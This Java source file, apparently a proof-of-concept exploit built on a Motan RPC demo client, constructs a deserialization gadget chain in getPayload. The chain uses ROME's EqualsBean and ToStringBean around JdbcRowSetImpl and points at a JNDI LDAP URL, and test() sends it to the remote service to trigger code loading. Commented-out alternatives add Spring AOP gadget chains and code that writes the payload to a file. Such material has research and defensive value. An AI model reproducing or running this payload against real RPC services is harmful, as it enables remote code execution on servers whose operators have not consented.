package com.weibo.motan.demo.client;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import com.threedr3am.exp.dubbo.payload.hessian.SpringAbstractBeanFactoryPointcutAdvisorPoc;
import com.threedr3am.exp.dubbo.utils.JDKUtil;
import com.threedr3am.exp.dubbo.utils.Reflections;
import com.threedr3am.exp.dubbo.utils.SpringUtil;
import com.weibo.api.motan.config.springsupport.annotation.MotanReferer;
import com.weibo.api.motan.util.LoggerUtil;
import com.weibo.motan.demo.service.MotanDemoService;
import org.aopalliance.aop.Advice;
import org.apache.coyote.Response;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.stereotype.Component;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

/**
 * Created by fld on 16/6/1.
 */
@Component
public class DemoRpcHandler {

    @MotanReferer
    private MotanDemoService motanDemoService;
    private static Object getPayload() throws Exception{
        String jndiurl="ldap://127.0.0.1:9988";
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class,JDKUtil.makeJNDIRowSet(jndiurl));
        EqualsBean root = new EqualsBean(ToStringBean.class,item);
        return JDKUtil.makeMap(root,root);
//        BeanFactory bf =  SpringUtil.makeJNDITrigger(jndiurl);
//        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
//        pcadv.setBeanFactory(bf);
//        pcadv.setAdviceBeanName(jndiurl);
//        pcadv.setAdvice((Advice) Reflections.createWithoutConstructor(AspectJAroundAdvice.class));
//        DefaultBeanFactoryPointcutAdvisor pcadv2 = new DefaultBeanFactoryPointcutAdvisor();
//        pcadv2.setBeanFactory(bf);
//        pcadv2.setAdviceBeanName(jndiurl);
//        return JDKUtil.makeMap(pcadv, pcadv2);
//        SpringAbstractBeanFactoryPointcutAdvisorPoc springAbstractBeanFactoryPointcutAdvisorPoc = new SpringAbstractBeanFactoryPointcutAdvisorPoc();
//        return springAbstractBeanFactoryPointcutAdvisorPoc.getPayload(jndiurl);

    }
    public void test() throws Exception {
            Object o = getPayload();
//        FileOutputStream fileOutputStream = new FileOutputStream("/tmp/fuck.ser");
//        ObjectOutputStream out = new ObjectOutputStream(fileOutputStream);
//        out.writeObject(o);
//        out.flush();
//        out.close();
            System.out.println(motanDemoService.commonTest(o));
            LoggerUtil.info("motan handler");


    }
}
